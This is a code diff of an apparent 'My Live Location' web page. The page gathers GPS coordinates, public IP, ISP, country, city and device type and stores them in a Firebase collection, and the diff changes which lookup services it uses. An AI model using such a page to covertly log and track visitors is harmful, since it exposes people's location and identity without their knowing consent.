@@ -69,9 +69,7 @@ text-align:center;
 
 <body>
 
-<header>
-📍 My Live Location
-</header>
+<header>📍 My Live Location</header>
 
 <div id="status">Please Wait...</div>
 
@@ -137,50 +135,53 @@ async function saveLocation(lat, lon){
 let ip="unknown"
 let city="unknown"
 let country="unknown"
-let country_code="bd"
 let isp="unknown"
 
 try{
 
+// IP detection
 const trace = await fetch("https://www.cloudflare.com/cdn-cgi/trace")
 const txt = await trace.text()
 
 const lines = txt.split("\n")
-const map = {}
+const data = {}
 
 lines.forEach(l=>{
 const p = l.split("=")
-if(p.length===2) map[p[0]] = p[1]
+if(p.length===2) data[p[0]] = p[1]
 })
 
-ip = map.ip || ip
-country_code = (map.loc || country_code).toUpperCase()
-
-const geo = await fetch("https://ipinfo.io/json")
-const data = await geo.json()
-
-city = data.city
-country = data.country
-isp = data.org
 ip = data.ip
 
-if(data.success){
-city = data.city || city
-country = data.country || country
-isp = (data.connection && data.connection.isp) ? data.connection.isp : isp
-country_code = data.country_code || country_code
+// ISP + country
+const geo = await fetch(`https://ipwho.is/${ip}`)
+const gdata = await geo.json()
+
+if(gdata.success){
+country = gdata.country
+isp = gdata.connection.isp
+}
+
+// Reverse geocoding (GPS → city)
+const rev = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`)
+const rdata = await rev.json()
+
+if(rdata.address){
+city = rdata.address.city || rdata.address.town || rdata.address.village
 }
 
 }catch(e){
-console.log("IP lookup failed:", e)
+console.log(e)
 }
 
+// UI update
 document.getElementById("ip").innerText = ip
 document.getElementById("city").innerText = city
 document.getElementById("country").innerText = country
 document.getElementById("isp").innerText = isp
 document.getElementById("device").innerText = detectDevice()
 
+// save firebase
 await addDoc(collection(db,"locations"),{
 
 latitude: lat,
@@ -190,7 +191,6 @@ time: new Date().toISOString(),
 ip: ip,
 city: city,
 country: country,
-country_code: country_code,
 isp: isp,
 
 device: detectDevice(),
